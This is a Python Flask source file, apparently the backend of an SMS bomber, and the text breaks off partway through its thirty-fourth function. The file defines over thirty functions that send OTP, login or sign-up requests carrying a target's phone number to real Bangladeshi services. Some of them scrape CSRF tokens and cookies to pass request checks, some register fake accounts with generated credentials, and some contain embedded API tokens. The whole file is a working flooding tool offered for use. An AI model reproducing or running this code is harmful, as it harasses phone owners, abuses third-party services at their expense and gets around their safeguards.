import requests
import random
import string
import re # Added for regex parsing in api_23
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["https://sms-bmbr-api.vercel.app"]) # This CORS is for API calls, not for iframe embedding.

def random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?n':
            result += str(random.randint(0, 9))
        elif char == '?l':
            result += random.choice(string.ascii_lowercase)
        elif char == '?i':
            result += random.choice(string.ascii_letters + string.digits)
    return result

def send_request(url, method, headers, data=None):
    try:
        if method == "POST":
            if headers.get("Content-Type") == "application/x-www-form-urlencoded":
                response = requests.post(url, headers=headers, data=data, timeout=10)
            else:
                response = requests.post(url, headers=headers, json=data, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def api_1(number, pgen, egen, did, name):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "core.easy.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {
        "password": pgen,
        "password_confirmation": pgen,
        "device_key": did,
        "name": name,
        "mobile": number,
        "email": f"{egen}info@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def api_2(number):
    url = "https://training.gov.bd/backoffice/api/user/sendOtp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "training.gov.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"mobile": number}
    return send_request(url, "POST", headers, data)

def api_3(number):
    url = "https://auth.qcoom.com/api/v1/otp/send"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "auth.qcoom.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"mobileNumber": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_4(number):
    url = "https://api.apex4u.com/api/auth/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.apex4u.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phoneNumber": number}
    return send_request(url, "POST", headers, data)

def api_5(number):
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.osudpotro.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"os": "web", "mobile": f"+88-{number}", "language": "en", "deviceToken": "web"}
    return send_request(url, "POST", headers, data)

def api_6(number):
    url = "https://api.busbd.com.bd/api/auth"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.busbd.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_7(number):
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "bkshopthc.grameenphone.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number, "language": "en", "email": ""}
    return send_request(url, "POST", headers, data)

def api_8(number):
    url = "https://app.deshal.net/api/auth/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "app.deshal.net",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def api_9(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api-dynamic.chorki.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"number": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_10(number, pgen, egen, name):
    url = "https://regalfurniturebd.com/api/auth/register"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "regalfurniturebd.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {
        "emergency_contact_number": number,
        "password_confirmation": pgen,
        "address": "",
        "address_1": "Dhaka,bd,ch",
        "address_2": "My,won,home",
        "telephone": number,
        "agree": True,
        "device_name": "web_browser",
        "password": pgen,
        "district": "Outside Dhaka",
        "post_code": "200",
        "name": name,
        "company": "dhaka",
        "email": f"{egen}@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def api_11(number):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "da-api.robi.com.bd",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"msisdn": number}
    return send_request(url, "POST", headers, data)

def api_12(number):
    url = "https://api.shikho.com/public/activity/otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.shikho.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_request(url, "POST", headers, data)

def api_13(number):
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.garibookadmin.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_request(url, "POST", headers, data)

def api_14(number):
    url = "https://api.pathao.com/v2/auth/register"
    headers = {
        "Accept-Encoding": "gzip",
        "Android-OS": "10",
        "App-Agent": "ride/android/491",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.pathao.com",
        "User-Agent": "okhttp/4.12.0"
    }
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_request(url, "POST", headers, data)

def api_15(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {"msisdn": number[1:]}
    return send_request(url, "POST", headers, data)

def api_16(number):
    url = "https://web.hishabee.business/auth"
    headers = {
        "Host": "web.hishabee.business",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    response = send_request(url, "GET", headers)
    if response:
        cookies = response.cookies.get_dict()
        cs1 = cookies.get('__Host-authjs.csrf-token', '')
        url = "https://web.hishabee.business/auth/otp"
        headers = {
            "Host": "web.hishabee.business",
            "Cookie": f"__Host-authjs.csrf-token={cs1}; __Secure-authjs.callback-url=https%3A%2F%2Fweb.hishabee.business; mobile_number={number}",
            "Content-Length": "33",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Next-Action": "99a8ce094437bb79461fdc714e10a9ff1d2b23a3",
            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "text/x-component",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://web.hishabee.business",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://web.hishabee.business/auth/otp",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=1, i"
        }
        data = [{"mobile_number": number}]
        return send_request(url, "POST", headers, data)
    return None

def api_17(number):
    url = "https://www.thebodyshop.com.bd/customer/account/create/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = send_request(url, "GET", headers)
    if response:
        cookies = response.cookies.get_dict()
        pid = cookies.get('PHPSESSID', '')
        url = "https://www.thebodyshop.com.bd/otpmanagement/transactional/sendOtp"
        headers = {
            "Host": "www.thebodyshop.com.bd",
            "Cookie": f"PHPSESSID={pid}",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Sec-Ch-Ua-Mobile": "?0",
            "Origin": "https://www.thebodyshop.com.bd",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.thebodyshop.com.bd/customer/account/create/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=1, i",
            "Connection": "keep-alive"
        }
        data = f"data=88{number}"
        return send_request(url, "POST", headers, data)
    return None

def api_18(number, did2):
    url = "https://banglaflix.com.bd/api4/flix_signup.php"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Host": "banglaflix.com.bd",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)"
    }
    data = f"release=9&simSerialNumber=no access&imsi=no access&deviceId={did2}&operatorName=Reliance Jio&operator=405840&versionCode=52&forget=forget&imei=no access&model=ASUS_I005DA&sdkVersion=28&msisdn=88{number}&brand=Asus&softwareVersion=no access"
    return send_request(url, "POST", headers, data)

def api_19(number):
    url = f"https://web-api.binge.buzz/api/v3/otp/send/+88{number}"
    headers = {
        "Host": "web-api.binge.buzz",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "",
        "Device-Type": "web",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://binge.buzz",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://binge.buzz/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    return send_request(url, "GET", headers)

def api_20(number):
    url = f"https://romoni.com.bd/api/send-otp?phone={number}"
    headers = {
        "Host": "romoni.com.bd",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Baggage": "sentry-environment=production,sentry-release=880ca2140ae01e8be9f40d7038e86f8cad534c12,sentry-public_key=f2f87e089348282a3638da93ac482415,sentry-trace_id=57e4f4f49fe5419f9318753fb854a4f6,sentry-sampled=true,sentry-sample_rand=0.6108252277741908,sentry-sample_rate=1",
        "Sentry-Trace": "57e4f4f49fe5419f9318753fb854a4f6-a216e13e893c2e20-1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://romoni.com.bd/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    return send_request(url, "GET", headers)

def api_21(number, egen, name):
    url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
    headers = {
        "Host": "go-app.paperfly.com.bd",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Device_identifier": "undefined",
        "Device_name": "undefined",
        "Origin": "https://go.paperfly.com.bd",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://go.paperfly.com.bd/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"full_name": f"{name} Koaa", "company_name": f"{name} Limites", "email_address": f"{egen}@gmail.com", "phone_number": number}
    return send_request(url, "POST", headers, data)

def api_22(number):
    url = f"https://chinaonlinebd.com/api/login/getOtp?phone={number}"
    headers = {
        "Host": "chinaonlinebd.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Token": "45601f3d391886fcec5f5a3f26780f21",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://chinaonlinebd.com/login?next=/dashboard",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    return send_request(url, "POST", headers, data={}) # Empty data for POST

def api_23(number):
    url = "https://accounts.sheba.xyz/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = send_request(url, "GET", headers)
    if response:
        cookies = response.cookies.get_dict()
        xt = cookies.get('XSRF-TOKEN', '')
        ac = cookies.get('accounts_sheba', '')
        
        # Extract appID and xpid from response text (this is a simplified parsing, might need regex for robustness)
        id_match = re.search(r'this.appID = "([^"]+)";', response.text)
        xid_match = re.search(r'\.loader_config={xpid:"([^"]+)",', response.text)
        
        app_id = id_match.group(1) if id_match else ""
        xpid = xid_match.group(1) if xid_match else ""

        url_token = f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
        headers_token = {
            "Host": "accounts.sheba.xyz",
            "Cookie": f"XSRF-TOKEN={xt}; accounts_sheba={ac}",
            "X-Newrelic-Id": xpid,
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://accounts.sheba.xyz/login",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=1, i"
        }
        response_token = send_request(url_token, "GET", headers_token)
        
        if response_token:
            token_match = re.search(r'token":"([^"]+)"}', response_token.text)
            token = token_match.group(1) if token_match else ""

            url_otp = "https://accountkit.sheba.xyz/api/shoot-otp"
            headers_otp = {
                "Host": "accountkit.sheba.xyz",
                "Sec-Ch-Ua-Platform": "\"Windows\"",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
                "Content-Type": "application/json",
                "Sec-Ch-Ua-Mobile": "?0",
                "Origin": "https://accounts.sheba.xyz",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://accounts.sheba.xyz/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Priority": "u=1, i"
            }
            data_otp = {"mobile": f"+88{number}", "app_id": app_id, "api_token": token}
            return send_request(url_otp, "POST", headers_otp, data_otp)
    return None

def api_24(number, pgen, name):
    url = "https://mybackend-bstw.onrender.com/api/v1/auth/registration"
    headers = {
        "Host": "mybackend-bstw.onrender.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "Bearer ihateyoucodding",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.volthbd.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.volthbd.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"firstName": f"Dilan {name}", "phoneNumber": number, "password": pgen, "affiliateRef": None}
    return send_request(url, "POST", headers, data)

def api_25(number):
    url = "https://www.livemcq.com/web-otp-send/"
    headers = {
        "Host": "www.livemcq.com",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    response = send_request(url, "GET", headers)
    if response:
        cookies = response.cookies.get_dict()
        cstk = cookies.get('csrftoken', '')
        url_verify = f"https://www.livemcq.com/web-otp-verify/?phone_number={number}"
        headers_verify = {
            "Host": "www.livemcq.com",
            "Cookie": f"csrftoken={cstk}",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Referer": "https://www.livemcq.com/web-otp-send/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=0, i"
        }
        return send_request(url_verify, "GET", headers_verify)
    return None

def api_26(number):
    url = "https://new.mojaru.com/api/student/registration"
    headers = {
        "Host": "new.mojaru.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://mojaru.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://mojaru.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"mobile_or_email": number}
    return send_request(url, "POST", headers, data)

def api_27(number):
    url = "https://new.mojaru.com/api/student/login"
    headers = {
        "Host": "new.mojaru.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://mojaru.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://mojaru.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"mobile_or_email": number}
    return send_request(url, "POST", headers, data)

def api_28(number):
    url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {"phoneNumber": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def api_29(number):
    url = "https://chokrojan.com/api/v1/passenger/login/mobile"
    headers = {
        "Host": "chokrojan.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "Bearer null",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Platform": "3",
        "Access-Control-Allow-Origin": "*",
        "Company-Id": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Domain-Name": "chokrojan.com",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://chokrojan.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://chokrojan.com/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    data = {"mobile_number": number}
    return send_request(url, "POST", headers, data)

def api_30(number):
    url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
    headers = {
        "Accept-Encoding": "gzip",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "backend-api.shomvob.co",
        "If-None-Match": "W/\"149-S9sRrXq7y+7G+40CRB5M3TCF6a0\"",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)"
    }
    data = {"phone": f"88{number}"}
    return send_request(url, "POST", headers, data)

def api_31(number):
    url = "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.35&os=android&osv=28"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "api.arogga.com",
        "User-Agent": "okhttp/4.9.2"
    }
    data = f"mobile={number}&fcmToken=cQNuZawqQAa_RlLyefabwM%3AAPA91bEch7lyfhnhwW9XBx8crxErLQr4_HCx3aefaEDNdiVD7VspFMca4v3BQnvIwmoSb5w3Zvp0oVDG4GeOfc6lZCDupbT3uvXLujlcAbbxPAzcUE73Cxs&referral="
    return send_request(url, "POST", headers, data=data) # Pass string data directly

def api_32(number):
    url = "https://backend.timezonebd.com/api/v1/user/otp-login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def api_33(number):
    url = "https://api.bdtickets.com:20100/v1/auth"
    headers = {
        "Host": "api.bdtickets.com:20100",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://bdtickets.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bdtickets.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1,"
    }
    data = {"createUserCheck": True, "phoneNumber": f"+88{number}", "applicationChannel": "WEB_APP"}
    return send_request(url, "POST", headers, data)

def api_34(number):
    url = "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup"
    headers = {
        "Host": "api.cartup.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json; charset=utf-8",
